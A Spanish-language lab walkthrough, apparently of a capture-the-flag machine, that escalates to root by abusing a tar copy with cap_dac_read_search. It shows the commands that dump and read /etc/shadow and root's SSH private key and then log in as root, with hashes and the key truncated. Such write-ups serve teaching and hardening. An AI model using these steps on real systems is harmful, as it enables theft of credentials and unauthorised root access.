
---

# Capabilities Exploitation — `tarS` mal configurado

En este apartado documentamos cómo, en un escenario de laboratorio, aprovechamos una **capability** mal configurada en un binario comprometido (`tarS`) para escalar privilegios y obtener acceso a información sensible. Aclaramos desde el principio que la vulnerabilidad proviene de una **mala configuración de capabilities** en un binario (en este caso `tarS`) que, por estar instalado con permisos especiales, permite leer ficheros a los que normalmente no tendríamos acceso.

---

## 1. Contexto y enumeración

Primero inspeccionamos las capabilities presentes en el sistema para identificar binarios con capacidades especiales:

```bash
[admin@votenow phpmyadmin]$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/tarS = cap_dac_read_search+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
````

- Observamos que **`/usr/bin/tarS`** tiene `cap_dac_read_search+ep`.
    
- Esta capability (`cap_dac_read_search`) permite evitar las comprobaciones DAC (discretionary access control) para lecturas y búsquedas en el filesystem en el contexto de ese binario, lo que indica una **mala configuración de capacidades** si el binario no debe tener acceso a archivos sensibles.
    


---

## 2. Abuso de `tarS` para extraer `/etc/shadow`

Probamos a crear un tar del archivo `/etc/shadow`. Al principio falló por permisos en el directorio corriente; cambiamos a `/tmp/` donde sí pudimos crear el archivo:

```bash
[admin@votenow phpmyadmin]$ tarS -cvf shadow.tar /etc/shadow
tarS: shadow.tar: Cannot open: Permission denied

[admin@votenow phpmyadmin]$ cd /tmp/
[admin@votenow tmp]$ tarS -cvf shadow.tar /etc/shadow
/etc/shadow
```

Extraemos el contenido:

```bash
[admin@votenow tmp]$ tarS -xf shadow.tar
[admin@votenow tmp]$ ls
etc  shadow.tar
```

El archivo extraído estaba sin permisos legibles por defecto:

```bash
[admin@votenow tmp]$ ls -l etc/shadow
---------- 1 admin admin 749 Jun 27  2020 etc/shadow
```

Cambiamos permisos localmente y leemos el fichero:

```bash
[admin@votenow tmp]$ chmod 777 etc/shadow
[admin@votenow tmp]$ cat etc/shadow
root:$6$Bvt...:18440:0:99999:7:::
admin:$6$QeT...:18440:0:99999:7:::
# ...
```

**Explicación pedagógica:** la capability en `tarS` permitió al proceso empaquetar y extraer ficheros del sistema que normalmente requieren permisos root. Al extraerlos en un directorio donde tenemos control, pudimos cambiar permisos y leerlos. Esto es un claro ejemplo de cómo una capability mal aplicada a un binario puede convertirse en un vector de lectura de secretos.

---

## 3. Extracción de la clave privada de root

Aplicamos el mismo método para `/root/.ssh/id_rsa`:

```bash
[admin@votenow tmp]$ tarS -cvf id_rsa.tar /root/.ssh/id_rsa
/root/.ssh/id_rsa

[admin@votenow tmp]$ tarS -xf id_rsa.tar
[admin@votenow tmp]$ cd root/.ssh/
[admin@votenow .ssh]$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgE...
-----END RSA PRIVATE KEY-----
```

**Impacto:** obtener la clave privada de root nos da un método directo para autenticarnos como root si existe un servicio SSH accesible que acepte la clave.

---

## 4. Conexión SSH local usando la clave obtenida

Comprobamos puertos y servicios escuchando:

```bash
[admin@votenow .ssh]$ ss -nltp
LISTEN 0 128 *:2082
LISTEN 0 50 127.0.0.1:3306
LISTEN 0 128 *:80
```

Usamos la clave para autenticarnos en el puerto 2082:

```bash
[admin@votenow .ssh]$ ssh -i id_rsa root@localhost -p 2082
[root@votenow ~]# whoami
root
```

**Resultado final:** hemos escalado a `root` aprovechando la capability mal configurada en `tarS` para extraer secretos y luego autenticar con la clave privada.

---

## 5. Conclusión pedagógica

- La raíz del problema no fue un exploit complejo, sino una **mala configuración de capabilities** en un binario (`tarS`) que otorgó privilegios de lectura más allá de lo esperado.
    
- Cuando un binario con capacidades como `cap_dac_read_search+ep` está disponible para un usuario no privilegiado, puede usarse para acceder a ficheros sensibles (hashes de `/etc/shadow`, claves privadas, etc.) y escalar privilegios indirectamente.
    
- En resumen: **capabilities mal asignadas = riesgo crítico de escalada** si el binario permite leer o manipular recursos protegidos.

---
